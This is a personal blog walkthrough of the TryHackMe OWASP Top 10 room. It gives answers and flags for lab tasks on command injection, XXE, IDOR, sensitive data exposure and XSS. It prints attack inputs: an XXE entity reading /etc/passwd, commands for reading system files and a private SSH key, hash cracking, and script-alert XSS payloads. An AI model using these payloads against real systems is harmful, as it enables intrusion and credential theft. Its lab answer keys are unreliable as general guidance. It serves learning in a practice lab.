---
title: "OWASP top10"
date: 2021-06-14T12:00:06+09:00
tags:
  - room
  - tryhackme
---

<p>This blog contains my walkthrough of the OWASP room in tryhackme while trying to learn more about cyber security. Check out the original room as well <a href="https://tryhackme.com/room/owasptop10">here.</a></p>
<h2 id="injection">Injection<a href="#injection" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<h3 id="task-5-command-injection-practical">Task 5: Command Injection Practical<a href="#task-5-command-injection-practical" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<h4 id="what-strange-text-file-is-in-the-website-root-directory">What strange text file is in the website root directory?<a href="#what-strange-text-file-is-in-the-website-root-directory" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Simply enter</p>
{{< highlight bash >}}
ls
{{< /highlight >}}

<p>The console will display multiple file names, out of which the most probably answer is <code>drpepper.txt</code></p>
<h4 id="how-many-non-rootnon-servicenon-daemon-users-are-there">How many non-root/non-service/non-daemon users are there?<a href="#how-many-non-rootnon-servicenon-daemon-users-are-there" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Enter</p>
{{< highlight bash >}}
cat /etc/passwd 
{{< /highlight >}}

<p>This will list a bunch of users and other information. I will go over it one by one.</p>
<p>Firstly, the command is used to list the users that are locally stored in the system. The structure of each output is
<code>user_name:encrypter_password:user_ID:user_group_ID:full_name:user_home_directory:user_bash_shell</code></p>
<p>Now, a normal user has UID $\geq$ 1000. Hence all the other users are system users. As we can see, all the IDs mentioned are below 1000, hence we get the answer as <code>0</code>
Read more about this <a href="https://linuxhandbook.com/linux-list-users/">here.</a></p>
<h4 id="what-user-is-the-app-running-as">What user is the app running as?<a href="#what-user-is-the-app-running-as" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Enter</p>
{{< highlight bash >}}
whoami 
{{< /highlight >}}

<p>As can be seen, the answer is <code>www-data</code></p>
<h4 id="what-is-the-users-shell-set-as">What is the user&rsquo;s shell set as?<a href="#what-is-the-users-shell-set-as" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Again, enter</p>
{{< highlight bash >}}
cat /etc/passwd
{{< /highlight >}}

<p>Now, you look at the user_bash_shell of <code>www-data</code> and we see that the answer is <code>/usr/sbin/nologin</code></p>
<h4 id="what-version-of-ubuntu-is-running">What version of Ubuntu is running?<a href="#what-version-of-ubuntu-is-running" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Enter</p>
{{< highlight bash >}}
hostnamectl
{{< /highlight >}}

<p>It will display a bunch of information about the OS the server is running on. Answer is <code>18.04.4</code></p>
<h4 id="print-out-the-motd-what-favorite-beverage-is-shown">Print out the MOTD. What favorite beverage is shown?<a href="#print-out-the-motd-what-favorite-beverage-is-shown" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Thew way I figured out the answer is simply by thinking that the name of strange text file was <code>drpepper.txt</code>. The name fit the answer so well :p</p>
<p>For a proper answer which I then googled for:</p>
<p>Enter</p>
{{< highlight bash >}}
ls /etc/update-motd.d/
cat /etc/update-motd.d/00-header
{{< /highlight >}}

<p>The last line of the output talks about <code>Dr Pepper</code> hence that is the answer.</p>
<h2 id="broken-authentication">Broken Authentication<a href="#broken-authentication" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<h3 id="task-7-broken-authentication-practical">Task 7: Broken Authentication Practical<a href="#task-7-broken-authentication-practical" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<h4 id="what-is-the-flag-you-find-in-darrens-account">What is the flag you find in darren&rsquo;s account?<a href="#what-is-the-flag-you-find-in-darrens-account" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Do as is mentioned, and once you log in you will see the flag <code>fe86079416a21a3c99937fea8874b667</code></p>
<h4 id="now-try-to-do-the-same-trick-and-see-if-you-can-login-as-arthur">Now try to do the same trick and see if you can login as arthur<a href="#now-try-to-do-the-same-trick-and-see-if-you-can-login-as-arthur" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Yes, you can</p>
<h4 id="what-is-the-flag-that-you-found-in-arthurs-account">What is the flag that you found in arthur&rsquo;s account?<a href="#what-is-the-flag-that-you-found-in-arthurs-account" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p><code>d9ac0f7db4fda460ac3edeb75d75e16e</code></p>
<h2 id="sensitive-data-exposure">Sensitive Data Exposure<a href="#sensitive-data-exposure" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<h3 id="task-11-sensitive-data-exposure-challenge">Task 11: Sensitive Data Exposure (Challenge)<a href="#task-11-sensitive-data-exposure-challenge" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<h4 id="what-is-the-name-of-the-mentioned-directory">What is the name of the mentioned directory<a href="#what-is-the-name-of-the-mentioned-directory" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Since I thought they have mentioned the directory in the source code, I checked it but did not find anything in the main page. Then on going to the Log-In page I found <code>/assets</code></p>
<h4 id="navigate-to-the-directory-you-found-in-question-one-what-file-stands-out-as-being-likely-to-contain-sensitive-data">Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?<a href="#navigate-to-the-directory-you-found-in-question-one-what-file-stands-out-as-being-likely-to-contain-sensitive-data" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Go to <code>http://MACHINE_IP/assets/</code>. Here,  we can see all the files and directories from which the answer is <code>webapp.db</code></p>
<h4 id="use-the-supporting-material-to-access-the-sensitive-data-what-is-the-password-hash-of-the-admin-user">Use the supporting material to access the sensitive data. What is the password hash of the admin user?<a href="#use-the-supporting-material-to-access-the-sensitive-data-what-is-the-password-hash-of-the-admin-user" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Download <code>webapp.db</code>. Then use the commands</p>
{{< highlight bash >}}
sqlite3 webapp.db
{{< /highlight >}}

<p>Once that is done, use the following commands</p>
{{< highlight sqlite3 >}}
> .tables
> pragma table_info(users);
> select * from users;
{{< /highlight >}}

<p>The answer is <code>6eea9b7ef19179a06954edd0f6c05ceb</code></p>
<h4 id="crack-the-hash">Crack the hash.<a href="#crack-the-hash" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Go to <a href="https://crackstation.net/">crackstation</a> as mentioned in the material and crack the password. The answer is <code>qwertyuiop</code></p>
<h4 id="log-in-as-the-admin-what-is-the-flag">Log in as the admin, what is the flag?<a href="#log-in-as-the-admin-what-is-the-flag" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Use the credentials you have, the answer is <code>THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</code></p>
<h2 id="xml-external-entity">XML External Entity<a href="#xml-external-entity" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<h3 id="task-13-extensible-markup-language">Task 13: eXtensible Markup Language<a href="#task-13-extensible-markup-language" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<h4 id="full-form-of-xml">Full form of XML<a href="#full-form-of-xml" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p><code>Extensible Markup Language</code></p>
<h4 id="is-it-compulsory-to-have-xml-prolog-in-xml-documents">is it compulsory to have XML prolog in XML documents?<a href="#is-it-compulsory-to-have-xml-prolog-in-xml-documents" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p><code>no</code></p>
<h4 id="can-we-validate-xml-documents-against-a-schema">Can we validate XML documents against a schema?<a href="#can-we-validate-xml-documents-against-a-schema" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p><code>yes</code></p>
<h4 id="how-can-we-specify-xml-version-and-encoding-in-xml-document">How can we specify XML version and encoding in XML document?<a href="#how-can-we-specify-xml-version-and-encoding-in-xml-document" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p><code>XML prolog</code></p>
<h4 id="document-type-definition-dtd">Document Type Definition (DTD)<a href="#document-type-definition-dtd" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<h4 id="how-do-you-define-a-new-element">How do you define a new ELEMENT?<a href="#how-do-you-define-a-new-element" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p><code>!ELEMENT</code></p>
<h4 id="how-do-you-define-a-root-element">How do you define a ROOT element?<a href="#how-do-you-define-a-root-element" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p><code>!DOCTYPE</code></p>
<h4 id="how-do-you-define-a-new-entity">How do you define a new ENTITY?<a href="#how-do-you-define-a-new-entity" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p><code>!ENTITY</code></p>
<h3 id="task-16-exploiting">Task 16: Exploiting<a href="#task-16-exploiting" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<h4 id="try-to-display-your-own-name-using-any-payload">Try to display your own name using any payload.<a href="#try-to-display-your-own-name-using-any-payload" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Enter</p>
{{< highlight xml >}}
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
<userInfo>
    <firstName>falcon</firstName>
    <lastName>&name;</lastName>
</userInfo>
{{< /highlight >}}

<h4 id="see-if-you-can-read-the-etcpasswd">See if you can read the /etc/passwd<a href="#see-if-you-can-read-the-etcpasswd" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Enter</p>
{{< highlight xml >}}
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
{{< /highlight >}}

<h4 id="what-is-the-name-of-the-user-in-etcpasswd">What is the name of the user in /etc/passwd?<a href="#what-is-the-name-of-the-user-in-etcpasswd" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>This can be determined by the output of the previous question. The answer is <code>falcon</code></p>
<h4 id="where-is-falcons-ssh-key-located">Where is falcon&rsquo;s SSH key located?<a href="#where-is-falcons-ssh-key-located" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>This was fairly simple to do. It is known that ssh keys are stored in either <code>.ssh/id_rsa</code> or <code>.ssh/id_rsa.pub</code> based on whether you need public or private key. As the next question asks for private key, we get the answer as <code>/home/falcon/.ssh/id_rsa</code></p>
<h4 id="what-are-the-first-18-characters-for-falcons-private-key">What are the first 18 characters for falcon&rsquo;s private key?<a href="#what-are-the-first-18-characters-for-falcons-private-key" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Simple enough, just use the location mentioned in previous answers and cat the file. Answer is <code>MIIEogIBAAKCAQEA7</code></p>
<h2 id="broken-access-control">Broken Access Control<a href="#broken-access-control" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<h3 id="task-18-idor-challenge">Task 18: IDOR Challenge<a href="#task-18-idor-challenge" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<h4 id="look-at-other-users-notes-what-is-the-flag">Look at other users notes. What is the flag?<a href="#look-at-other-users-notes-what-is-the-flag" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>There are better methods to do thus (using Burpsuite) but since I did not know about it when I started this challenge, I just had to luck out by getting the answer at <code>note=0</code></p>
<h2 id="security-misconfiguration">Security Misconfiguration<a href="#security-misconfiguration" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<h3 id="task-19-security-misconfiguration">Task 19: Security Misconfiguration<a href="#task-19-security-misconfiguration" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<h4 id="hack-into-the-webapp-and-find-the-flag">Hack into the webapp, and find the flag!<a href="#hack-into-the-webapp-and-find-the-flag" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>So the first thing I did was go through the source code, but I couldnt find any comment of sorts there. Next, I thought to check it out in exploit db, but there too I did not get a good answer. I googled about then I found out that the answer was mentioned in its <a href="https://github.com/NinjaJc01/PensiveNotes">github page</a></p>
<h2 id="cross-site-scripting">Cross-site Scripting<a href="#cross-site-scripting" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<h4 id="cross-site-scripting-1">Cross-site Scripting<a href="#cross-site-scripting-1" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<h4 id="craft-a-reflected-xss-payload-that-will-cause-a-popup-saying-hello">Craft a reflected XSS payload that will cause a popup saying &ldquo;Hello&rdquo;<a href="#craft-a-reflected-xss-payload-that-will-cause-a-popup-saying-hello" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>The answer is simple enough</p>
{{< highlight html >}}
<script>alert('Hello')</script>
{{< /highlight >}}

<h4 id="on-the-same-reflective-page-craft-a-reflected-xss-payload-that-will-cause-a-popup-with-your-machines-ip-address">On the same reflective page, craft a reflected XSS payload that will cause a popup with your machine&rsquo;s IP address.<a href="#on-the-same-reflective-page-craft-a-reflected-xss-payload-that-will-cause-a-popup-with-your-machines-ip-address" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Google around the command to display your machines IP address in JS, after which enter</p>
{{< highlight html >}}
<script>alert(windows.location.host)</script>
{{< /highlight >}}

